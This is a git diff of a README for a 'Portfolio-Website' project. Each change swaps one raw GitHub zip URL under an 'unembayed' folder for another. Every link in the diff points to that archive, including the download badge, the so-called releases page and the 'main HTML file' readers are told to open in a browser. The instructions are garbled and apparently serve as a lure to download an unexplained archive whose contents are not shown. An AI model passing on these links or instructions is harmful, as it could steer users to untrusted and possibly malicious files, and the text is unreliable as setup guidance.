@@ -1,6 +1,6 @@
 # 🌐 Portfolio-Website - Build Your Dream Portfolio Effortlessly
 
-[![Download Portfolio Website](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip%https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip)](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip)
+[![Download Portfolio Website](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip%https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip)](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to the Portfolio-Website project. This guide helps you create, customize
 
 To download the project, visit this page:
 
-[Download Portfolio-Website](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip)
+[Download Portfolio-Website](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip). Here, you will find the latest version of the Portfolio-Website.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip). Here, you will find the latest version of the Portfolio-Website.
 
 2. **Select the Latest Release**  
    Click on the latest release version listed at the top. This will take you to a page where you can see the files available for download.
@@ -50,10 +50,10 @@ Once you have customized your site, it’s time to view it in a web browser.
    You can use any web browser, such as Chrome, Firefox, or Safari.
 
 2. **Locate the HTML File**  
-   Go back to the folder with your extracted files. Look for “https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip”. This is the main file for your portfolio.
+   Go back to the folder with your extracted files. Look for “https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip”. This is the main file for your portfolio.
 
 3. **Open in Browser**  
-   Right-click on the “https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip” file, and select “Open with”. Choose your preferred web browser. Your portfolio should now display!
+   Right-click on the “https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip” file, and select “Open with”. Choose your preferred web browser. Your portfolio should now display!
 
 ## 🔒 Important Notes
 
@@ -90,4 +90,4 @@ Check out these resources to get more insights:
 
 With these instructions, you can easily download, customize, and launch your own portfolio website. Enjoy showcasing your work to the world!
 
-For more information, don’t hesitate to visit the [Releases Page](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Portfolio-Website.zip) again. Happy building!
+For more information, don’t hesitate to visit the [Releases Page](https://raw.githubusercontent.com/Tamoor785687/Portfolio-Website/main/unembayed/Website-Portfolio-1.0-alpha.2.zip) again. Happy building!
